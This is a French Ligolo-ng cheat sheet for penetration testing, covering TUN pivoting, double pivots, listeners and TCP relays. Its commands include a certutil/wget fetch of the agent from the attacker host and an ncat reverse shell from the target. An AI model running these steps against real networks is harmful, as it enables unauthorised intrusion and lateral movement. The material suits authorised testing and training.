---
name: ligolo-ng
description: Ligolo-ng — pivoting par interface TUN, tunnel TUN double-pivot, écouteur de reverse shell, listener forwarding, relais TCP, et scénarios de rebond réseau avancés.
---

# Ligolo-ng — Pivoting Niveau TUN

## Présentation

Ligolo-ng crée une interface TUN virtuelle pour donner un accès direct à un réseau interne comme si l'attaquant y était physiquement connecté. Contrairement à Chisel (SOCKS), Ligolo-ng opère au niveau IP (tunnel TUN).

**Avantages :**
- Pas besoin de proxy chain (tout est routé)
- Support natif du double-pivoting
- Peut rediriger des ports + créer des tunnels
- Interface TUN = comme si vous étiez sur place

**Installation :**
```bash
# Télécharger les binaires
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_X.X.X_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_X.X.X_linux_amd64.tar.gz

# Extraire
tar xzf ligolo-ng_proxy_*.tar.gz
tar xzf ligolo-ng_agent_*.tar.gz

# Windows agent
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_X.X.X_windows_amd64.zip
```

---

## Architecture

```
┌──────────────┐      ┌─────────────┐      ┌──────────────┐
│   Attaquant  │      │   Pivot     │      │  Cible       │
│  (Kali)      │◄────►│ (Machine    │◄────►│  (Réseau     │
│  proxy       │      │  compromise)│      │  interne)    │
│  TUN ligolo  │      │  agent      │      │  192.168.2.10│
└──────────────┘      └─────────────┘      └──────────────┘
```

---

## Configuration du proxy (attaquant)

### Étape 1 : Créer l'interface TUN
```bash
# Créer une interface TUN virtuelle
sudo ip tuntap add user $(whoami) mode tun ligolo

# Activer l'interface
sudo ip link set ligolo up

# Ajouter une route bidon (nécessaire au bon fonctionnement)
sudo ip route add 240.0.0.1 dev ligolo

# Vérifier
ip addr show ligolo
ip route show | grep ligolo
```

### Étape 2 : Lancer le proxy
```bash
# Proxy HTTP (self-signed cert)
./proxy -selfcert -laddr 0.0.0.0:11601

# Proxy avec certificat personnalisé
./proxy -laddr 0.0.0.0:11601 -cert cert.pem -key key.pem

# Proxy avec debug
./proxy -selfcert -laddr 0.0.0.0:11601 -debug
```

---

## Déploiement de l'agent (cible)

### Linux
```bash
# Connexion simple (auto)
./agent -connect 192.168.1.50:11601 -ignore-cert

# Avec nom d'agent personnalisé
./agent -connect 192.168.1.50:11601 -ignore-cert -name windows-dc01

# Avec reconnexion automatique (reconnect toutes les 5s si perte)
./agent -connect 192.168.1.50:11601 -ignore-cert -retry

# Mode debug
./agent -connect 192.168.1.50:11601 -ignore-cert -debug
```

### Windows
```cmd
agent.exe -connect 192.168.1.50:11601 -ignore-cert
```

### Transfert de l'agent
```bash
# Via wget/curl sur la cible
wget http://192.168.1.50:8080/agent -O agent
curl -o agent http://192.168.1.50:8080/agent

# Via Python HTTP server (attaquant)
python3 -m http.server 8080

# Via SMB
impacket-smbserver SHARE /tmp/ligolo
copy \\192.168.1.50\SHARE\agent.exe C:\Temp\agent.exe

# Via certutil (Windows)
certutil -urlcache -f http://192.168.1.50/agent.exe agent.exe
```

---

## Gestion des sessions (proxy console)

### Sessions
```bash
# La console proxy montre les agents connectés :
# [Agent] New agent: windows-dc01 (192.168.1.10)

# Lister les agents
session

# Sélectionner un agent
session 0

# Démarrer le tunnel
start

# Arrêter le tunnel
stop
```

### Routage
```bash
# Une fois l'agent sélectionné et le tunnel démarré
# Ajouter les routes réseau sur la machine attaquante

# Route vers un /24
sudo ip route add 192.168.2.0/24 dev ligolo

# Route vers une seule IP
sudo ip route add 192.168.2.10/32 dev ligolo

# Route vers plusieurs réseaux
sudo ip route add 192.168.2.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo

# Vérifier les routes
ip route show

# Tester
ping 192.168.2.1
nmap -sS 192.168.2.10
```

---

## Écouteurs (Listener)

### Reverse listener
```bash
# Sur l'attaquant (proxy) : ajouter un écouteur
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp

# Cela redirige les connexions entrantes sur l'agent
# vers le port 4444 de l'attaquant

# Exemple : reverse shell depuis la cible
# Sur la cible 192.168.2.10 :
ncat 192.168.1.10 4444 -e cmd.exe
# → reçu sur l'attaquant 127.0.0.1:4444

# Lister les écouteurs
listener_list

# Supprimer un écouteur
listener_rm 0
```

### Forward listener
```bash
# Rediriger un port de l'agent vers l'attaquant
# Exposer le port 3389 de l'agent sur l'attaquant
listener_add --addr 0.0.0.0:3389 --to 192.168.2.10:3389 --tcp

# Maintenant rdesktop 127.0.0.1:3389 donne accès à la cible
rdesktop 127.0.0.1:3389
```

---

## Double-pivoting

```
Attaquant ──► Pivot1 ──► Pivot2 ──► Cible
             (192.168.1.0/24)  (192.168.2.0/24)  (10.0.0.0/24)
```

### Configuration
```bash
# === ATTAQUANT ===
# Créer 2 interfaces TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo up
sudo ip link set ligolo2 up
sudo ip route add 240.0.0.1 dev ligolo
sudo ip route add 240.0.0.2 dev ligolo2

# Lancer le proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# === PIVOT 1 ===
./agent -connect 192.168.1.50:11601 -ignore-cert
# Dans proxy : session 0, start
sudo ip route add 192.168.2.0/24 dev ligolo

# Ajouter un listener sur le proxy (port 11602)
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp

# === PIVOT 2 (accessible DEPUIS Pivot 1 sur 192.168.2.x) ===
./agent -connect 192.168.1.50:11602 -ignore-cert
# 11602 est relayé → proxy sur 11601 par Pivot1

# Dans proxy : session 1, start
sudo ip route add 10.0.0.0/24 dev ligolo2

# === CIBLE ===
# Maintenant accessible via 10.0.0.x
nmap 10.0.0.10
```

---

## Relais TCP

```bash
# Rediriger le trafic vers un service du réseau interne
# Ex : exposer RDP (3389) d'une machine 10.0.0.10 vers l'attaquant
listener_add --addr 0.0.0.0:3389 --to 10.0.0.10:3389 --tcp

# Ex : exposer SMB (445)
listener_add --addr 0.0.0.0:445 --to 10.0.0.20:445 --tcp

# Liste
listener_list

# Supression
listener_rm 0
```

---

## Script d'automatisation

```bash
#!/bin/bash
# start_ligolo.sh — automatisation du proxy

INTERFACE="ligolo"
PROXY_PORT=11601
TUN_IP="240.0.0.1"

echo "[+] Configuration de l'interface TUN..."
sudo ip tuntap add user $(whoami) mode tun $INTERFACE 2>/dev/null
sudo ip link set $INTERFACE up
sudo ip route add $TUN_IP dev $INTERFACE 2>/dev/null

echo "[+] Démarrage du proxy..."
./proxy -selfcert -laddr 0.0.0.0:$PROXY_PORT
```

---

## Ligolo-ng vs Chisel

| Critère | Ligolo-ng | Chisel |
|---------|-----------|--------|
| **Niveau** | IP (TUN) | TCP (SOCKS) |
| **Performance** | Très haute | Moyenne |
| **Multi-pivot** | Natif (TUN) | Proxy chain |
| **Facilité** | Config TUN | Simple (SOCKS) |
| **Port forwarding** | Listener add | -L -R |
| **Reverse SOCKS** | Non (TUN) | Oui |
| **Poids** | ~8 MB | ~10 MB |
| **Windows** | Oui | Oui |

---

## Dépannage

| Problème | Solution |
|----------|----------|
| Permission TUN | Ajouter l'user au groupe : `sudo adduser $USER netdev` |
| Rien ne route | Vérifier ip route ; `ping 192.168.2.1` |
| Agent refuse | Vérifier pare-feu : `ufw allow 11601` |
| Double pivot lourd | Limiter avec des routes spécifiques |
| Perte de session | `-retry` sur l'agent |

---

## Antisèche rapide

```bash
# === ATTAQUANT ===
# 1. Interface TUN
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1 dev ligolo

# 2. Proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# 3. Quand l'agent se connecte :
session 0
start

# 4. Route vers le réseau interne
sudo ip route add 192.168.2.0/24 dev ligolo

# === CIBLE ===
./agent -connect 192.168.1.50:11601 -ignore-cert

# Écouteur reverse
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```